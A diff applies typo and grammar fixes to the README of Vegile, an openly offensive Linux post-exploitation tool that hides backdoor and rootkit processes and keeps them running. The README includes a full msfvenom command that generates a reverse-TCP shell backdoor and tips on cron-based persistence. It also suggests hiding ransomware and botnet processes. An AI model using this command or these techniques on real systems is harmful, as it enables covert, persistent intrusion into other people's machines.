@@ -4,30 +4,30 @@
 [![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()
 [![Build](https://img.shields.io/badge/Supported_OS-Linux-orange.svg)]()
 
-**Vegile** is a tool for **Post exploitation** Techniquesin linux. Post Exploitation techniques will ensure that we maintain some level of **access and can potentially** lead to **deeper** footholds into our targets **trusted network**.
+**Vegile** is a tool for **Post exploitation** Techniques in linux. Post Exploitation techniques will ensure that we maintain some level of **access and can potentially** lead to **deeper** footholds into our targets **trusted network**.
 
 
 <img src="https://user-images.githubusercontent.com/17976841/34869598-fd7cf00e-f7b9-11e7-950e-a4cb61364c03.png" ></img>
 
 ### Donate
-- If this project very help you to penetration testing  and u want support me , you can give me a cup of coffee :)
+- If this project is very helpful to your penetration testing and u want to support me , you can give me a cup of coffee :)
 - [![Donation](https://img.shields.io/badge/bitcoin-donate-yellow.svg)](https://blockchain.info/id/address/1NuNTXo7Aato7XguFkvwYnTAFV2immXmjS)
 
 
 
 ## :book: How it works
 
-This tool will setting up your ***backdoor/rootkits***
-when backdoor already setup it will be ***hidden*** your spesisifc process,***unlimited*** your ***session*** in metasploit and ***transparent***. Even when it **killed**, it will **re-run again**. There always be a procces which while **run** another process,So we can assume that this procces is **unstopable** like a **Ghost in The Shell**
+This tool will set up your ***backdoor/rootkits***
+when backdoor is already setup it will be ***hidden*** your specific process,***unlimited*** your ***session*** in metasploit and ***transparent***. Even when it is **killed**, it will **re-run again**. There will always be a procces which will **run** another process, so we can assume that this procces is **unstopable** like a **Ghost in The Shell**
 
 #### READ THIS
 
-- right now i just tested backdoor with msfvenom command using reverse_shell and my manual backdoor for linux [ **its work** ] or you can use thefatrat for help you creating a simple backdoor
+- Right now I just tested backdoor with msfvenom command using reverse_shell and my manual backdoor for linux [ **it works** ] or you can use thefatrat for to help you create a simple backdoor
 - **msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f elf -o NAME_BACKDOOR**
 - for hidden process you can use for **rootkits,backdoor,ransom and botnet** { sh,python,perl,exe and binary }.
 - Victim  target all linux distribution include ( **base32** and **base64** in their system ) 
 - For get persistence you can use **crontab and xinit.d** into your backdoor  
-- this just simple algorithma how we can maintain our sessions and backdoor/rootkits , **you can explore this**
+- this is just a simple algorithm how we can maintain our sessions and backdoor/rootkits , **you can explore this**
 
 
 
@@ -63,4 +63,4 @@ Running Vegile without any parameters will give a helpful list of the most commo
 
 ## Disclaimer
 
-***Note: modifications, changes, or alterations to this sourcecode is acceptable, however,any public releases utilizing this code must be approved by writen this tool ( Edo -m- ).***
+***Note: modifications, changes, or alterations to this sourcecode is acceptable, however, any public releases utilizing this code must be approved by writen this tool ( Edo -m- ).***
